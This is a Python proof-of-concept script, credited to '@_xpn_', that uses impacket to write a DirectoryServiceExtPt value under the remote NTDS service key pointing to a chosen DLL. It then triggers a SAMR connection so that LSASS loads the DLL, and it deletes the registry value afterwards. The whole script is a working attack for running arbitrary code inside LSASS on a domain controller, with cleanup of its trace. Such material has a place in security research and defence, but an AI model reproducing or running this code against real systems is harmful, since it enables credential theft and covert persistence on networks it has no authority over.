from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt, samr
from impacket.smbconnection import SMBConnection

def trigger_samr(remoteHost, username, password):

    print("[*] Connecting to SAMR RPC service")

    try:
        rpctransport = transport.SMBTransport(remoteHost, 445, r'\samr', username, password, "", "", "", "")
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
    except (Exception) as e:
        print("[x] Error binding to SAMR: %s" % e)
        return

    print("[*] Connection established, triggering SamrConnect to force load the added DLL")

    # Trigger
    samr.hSamrConnect(dce)

    print("[*] Triggered, DLL should have been executed...")

def start(remoteName, remoteHost, username, password, dllPath):

    winreg_bind = r'ncacn_np:445[\pipe\winreg]'
    hRootKey = None
    subkey = None
    rrpclient = None

    print("[*] Connecting to remote registry")

    try:
        rpctransport = transport.SMBTransport(remoteHost, 445, r'\winreg', username, password, "", "", "", "")
    except (Exception) as e:
        print("[x] Error establishing SMB connection: %s" % e)
        return

    try:
        # Set up winreg RPC
        rrpclient = rpctransport.get_dce_rpc()
        rrpclient.connect()
        rrpclient.bind(rrp.MSRPC_UUID_RRP)
    except (Exception) as e:
        print("[x] Error binding to remote registry: %s" % e)
        return

    print("[*] Connection established")
    print("[*] Adding new value to SYSTEM\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPtr")

    try:
        # Add a new registry key
        ans = rrp.hOpenLocalMachine(rrpclient)
        hRootKey = ans['phKey']
        subkey = rrp.hBaseRegOpenKey(rrpclient, hRootKey, "SYSTEM\\CurrentControlSet\\Services\\NTDS")
        rrp.hBaseRegSetValue(rrpclient, subkey["phkResult"], "DirectoryServiceExtPt", 1, dllPath)
    except (Exception) as e:
        print("[x] Error communicating with remote registry: %s" % e)
        return

    print("[*] Registry value created, DLL will be loaded from %s" % (dllPath))

    trigger_samr(remoteHost, username, password)

    print("[*] Removing registry entry")
    
    try:
        rrp.hBaseRegDeleteValue(rrpclient, subkey["phkResult"], "DirectoryServiceExtPt")
    except (Exception) as e:
        print("[x] Error deleting from remote registry: %s" % e)
        return

    print("[*] All done")

print("LSASS DirectoryServiceExtPt POC\n     @_xpn_\n")
